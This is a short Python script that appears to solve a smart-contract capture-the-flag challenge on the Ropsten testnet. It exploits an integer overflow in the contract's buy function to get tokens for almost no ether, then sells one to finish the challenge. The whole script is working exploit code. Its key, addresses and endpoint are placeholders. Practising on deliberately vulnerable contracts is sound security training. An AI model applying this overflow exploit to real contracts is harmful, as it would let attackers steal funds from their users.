from web3 import Web3, HTTPProvider
import urllib3
from solc import compile_source

urllib3.disable_warnings()
web3 = Web3(HTTPProvider('https://ropsten.infura.io/xxxxxxxxxx', {'verify': False}))

private_key = '0x000000000000000000000000000000'
account = web3.eth.account.privateKeyToAccount(private_key)
web3.eth.defaultAccount = account.address

challenge_contract_address = '0x000000000000000000000000000'
with open('challenge.sol', 'r') as f:
    contract_source_code = f.read()

compiled_sol = compile_source(contract_source_code, allow_paths='.')['<stdin>:TokenSaleChallenge']

def send_transaction_sync(tx, args={}):
    args['nonce'] = web3.eth.getTransactionCount(account.address)
    signed_txn = account.signTransaction(tx.buildTransaction(args))
    tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
    return web3.eth.waitForTransactionReceipt(tx_hash)

contract = web3.eth.contract(abi=compiled_sol['abi'], address=challenge_contract_address)


min_token_number_with_overflow = 2**256 // 10**18 + 1
value = (min_token_number_with_overflow * 10**18) % 2**256

print('Buying...')
tx = contract.functions.buy(min_token_number_with_overflow)
send_transaction_sync(tx, {'value': value, 'gas': 3000000})
print('Bought!')

print('Selling...')
tx = contract.functions.sell(1)
send_transaction_sync(tx, {'gas': 3000000})
print('Sold!')

print('Solved')
